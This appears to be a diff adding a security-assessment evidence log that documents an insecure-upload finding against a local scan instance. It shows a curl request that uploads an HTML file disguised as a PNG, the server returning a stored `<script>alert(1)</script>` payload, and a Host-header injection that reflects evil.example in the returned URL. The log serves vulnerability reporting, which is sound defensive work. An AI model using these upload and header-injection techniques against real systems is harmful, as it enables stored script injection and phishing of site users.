@@ -1,0 +1,27 @@
+================================================================
+EV-M5 : Insecure file upload - HTML/script content accepted as .png (extension-only filter, no content validation)  [2026-09-21 15:30:07]
+Target: http://localhost:3101  (temporary scan instance, dedicated scan DB)
+================================================================
+
+---- REQUEST ----
+curl.exe -s -X POST http://localhost:3101/api/upload -F 'file=@evil.html;type=text/html' (field name per upload.routes.ts: 'file')
+---- RESPONSE ----
+--- 1. Upload an HTML file named evil.html but with .png extension and image/png mime override ---
+{"url":"http://localhost:3101/uploads/1789984808467-706015188.png","filename":"1789984808467-706015188.png"}
+--- 2. Stored file served back under /uploads with original HTML content ---
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Accept-Ranges: bytes
+Cache-Control: public, max-age=0
+Last-Modified: Mon, 21 Sep 2026 10:00:08 GMT
+ETag: W/"38-1a0c3689f19"
+Content-Type: image/png
+Content-Length: 56
+Date: Mon, 21 Sep 2026 10:00:09 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+<html><body><script>alert(1)</script>pwned</body></html>
+--- 3. Returned URL reflects arbitrary Host header (Host-header injection in response URL) ---
+{"url":"http://evil.example:9999/uploads/1789984809128-6498503.png","filename":"1789984809128-6498503.png"}
